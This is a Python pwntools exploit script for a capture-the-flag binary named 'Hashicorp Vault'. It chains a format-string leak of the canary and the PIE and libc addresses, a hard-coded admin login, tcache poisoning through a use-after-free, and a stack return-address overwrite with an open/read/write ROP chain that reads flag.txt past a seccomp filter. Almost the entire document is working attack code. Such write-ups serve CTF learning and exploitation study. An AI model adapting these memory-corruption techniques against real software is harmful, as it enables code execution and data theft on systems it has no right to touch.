#!/usr/bin/env python3
"""
Hashicorp Vault CTF Challenge - Working Exploit
================================================
Vulnerabilities:
  1. Format String in login() -> leak canary, PIE, libc base
  2. UAF in return_vault() (no NULL after free) -> tcache poisoning
  3. Tcache poison -> stack ret addr overwrite -> ROP chain
  4. SECCOMP blocks execve/execveat -> open/read/write ROP

Key offsets (empirically found):
  - %15$p = canary
  - %17$p = PIE leak (pie_base + 0x1875)
  - %21$p = libc leak (libc_base + 0x24083 = __libc_start_main+0xf3)
  - fd_offset = 0x138 (environ_val - 0x138 = store_item frame start)
  - pad = 7 (bytes after \\n before canary in payload)
  - open() fd = 6 (NOT 3! socat inherits fd=3,4,5 sockets to child)
"""
import time
from pwn import *

context.arch = 'amd64'

def solve():
    context.log_level = 'info'
    exe  = ELF("./dist/hashicorp-vault", checksec=False)
    libc = ELF("./lib/libc-2.31.so", checksec=False)
    r = remote('127.0.0.1', 1112)

    def rent(idx, size):
        r.sendlineafter(b"> ", b"1")
        r.sendlineafter(b"Vault index (0-9): ", str(idx).encode())
        r.sendlineafter(b"Size: ", str(size).encode())
        time.sleep(0.05)

    def store(idx, data):
        r.sendlineafter(b"> ", b"2")
        r.sendlineafter(b"Vault index: ", str(idx).encode())
        r.sendafter(b"Data: ", data)
        time.sleep(0.05)

    def view(idx):
        r.sendlineafter(b"> ", b"3")
        r.sendlineafter(b"Vault index: ", str(idx).encode())
        r.recvuntil(b"Item: ")
        res = r.recvline().strip()
        time.sleep(0.05)
        return res

    def ret_vault(idx):
        r.sendlineafter(b"> ", b"4")
        r.sendlineafter(b"Vault index: ", str(idx).encode())
        time.sleep(0.05)

    # ── Step 1: Format string leak ────────────────────────────────────────
    log.info("Step 1: Format string leak")
    r.sendafter(b"Username: ", b"%15$p.%17$p.%21$p.\n\x00")
    r.recvuntil(b"user: ")
    leaks = r.recvline().strip().split(b".")

    canary    = int(leaks[0], 16)
    pie_leak  = int(leaks[1], 16)
    libc_leak = int(leaks[2], 16)

    exe.address  = pie_leak  - 0x1875
    libc.address = libc_leak - 0x24083

    log.success(f"Canary:    {hex(canary)}")
    log.success(f"PIE base:  {hex(exe.address)}")
    log.success(f"Libc base: {hex(libc.address)}")

    # ── Step 2: Admin login ───────────────────────────────────────────────
    r.sendafter(b"Username: ", b"S3cr3t_M4st3r_4dm1n\n\x00")
    r.recvuntil(b"Welcome back, Admin!")
    log.success("Admin login OK")

    # ── Step 3: Tcache poison [0x20] -> environ -> leak stack ─────────────
    log.info("Step 3: Tcache UAF -> libc.environ -> stack leak")
    rent(0, 0x100)          # guard chunk (prevent consolidation)
    rent(1, 0x20)
    rent(2, 0x20)
    ret_vault(2)            # tcache[0x20]: chunk2
    ret_vault(1)            # tcache[0x20]: chunk1 -> chunk2

    store(1, p64(libc.sym['environ']))  # UAF: overwrite chunk1.fd = &environ

    rent(2, 0x20)           # pop chunk1
    rent(3, 0x20)           # pop libc.environ -> vaults[3] = &environ

    stack_leak = u64(view(3).ljust(8, b'\x00'))
    log.success(f"Stack leak (environ value): {hex(stack_leak)}")

    # ── Step 4: Tcache poison [0x90] -> BSS -> write "flag.txt" ──────────
    log.info("Step 4: Write 'flag.txt' to BSS")
    flag_bss = exe.bss() + 0x200
    log.info(f"flag_bss: {hex(flag_bss)}")

    rent(8, 0x90)
    rent(9, 0x90)
    ret_vault(9)
    ret_vault(8)
    store(8, p64(flag_bss))  # UAF: chunk8.fd = flag_bss

    rent(4, 0x90)            # pop chunk8
    rent(5, 0x90)            # pop flag_bss -> vaults[5] = flag_bss

    store(5, b"flag.txt\x00")

    # ── Step 5: Tcache poison [0x100] -> stack ret addr ───────────────────
    log.info("Step 5: Tcache UAF -> stack (overwrite store_item ret addr)")
    # Empirically found: fd_addr = environ_val - 0x138
    # Stack layout at fd_addr:
    #   +0x00 .. +0x07: below store_item's canary
    #   +0x08 .. +0x0f: canary
    #   +0x10 .. +0x17: saved rbp
    #   +0x18 ..      : ret addr (start of ROP chain here)
    fd_addr = stack_leak - 0x138
    log.info(f"fd_addr: {hex(fd_addr)}")

    rent(6, 0x100)
    rent(7, 0x100)
    ret_vault(7)
    ret_vault(6)
    store(6, p64(fd_addr))  # UAF: chunk6.fd = fd_addr (on stack)

    rent(8, 0x100)           # pop chunk6
    rent(9, 0x100)           # pop fd_addr -> vaults[9] = fd_addr (stack!)

    # ── Step 6: Build and send ROP chain ──────────────────────────────────
    log.info("Step 6: Build ROP: open/read/write flag")
    # IMPORTANT: socat with fork+EXEC leaves fd=3,4,5 (sockets) open in child.
    # Therefore open("flag.txt") returns fd=6, not fd=3!
    rop = ROP(libc)
    rop.call(libc.sym['open'],  [flag_bss, 0])       # open("flag.txt", O_RDONLY) -> fd=6
    rop.call(libc.sym['read'],  [6, flag_bss, 0x100]) # read(6, buf, 256)
    rop.call(libc.sym['write'], [1, flag_bss, 0x100]) # write(stdout, buf, 256)

    rop_chain = rop.chain()
    log.info(f"ROP chain: {len(rop_chain)} bytes")

    # Payload layout written to fd_addr (= vaults[9]):
    #   byte 0:    \n     <- leftover from scanf("9\n")
    #   byte 1-7:  A * 7  <- pad to canary
    #   byte 8-15: canary
    #   byte 16-23: saved rbp (0)
    #   byte 24+:  ROP chain
    payload  = b"\n"
    payload += b"A" * 7
    payload += p64(canary)
    payload += p64(0)
    payload += rop_chain

    assert len(payload) <= 0x100, f"Payload too large: {len(payload)}"
    log.info(f"Payload: {len(payload)}/256 bytes")

    r.sendlineafter(b"> ", b"2")
    r.sendlineafter(b"Vault index: ", b"9")
    r.sendafter(b"Data: ", payload)

    # ── Step 7: Receive flag ───────────────────────────────────────────────
    try:
        res = r.recvall(timeout=4)
        log.info(f"Got {len(res)} bytes")
        for kw in [b"UIT{", b"CTF{", b"flag{"]:
            if kw in res:
                idx = res.find(kw)
                flag = res[idx:].split(b"\x00")[0].decode(errors='replace')
                log.success(f"FLAG: {flag}")
                break
        else:
            log.warning(f"No flag found. Response: {res[:200]}")
    except Exception as ex:
        log.error(f"Error: {ex}")
    finally:
        r.close()

def main():
    solve()

if __name__ == "__main__":
    main()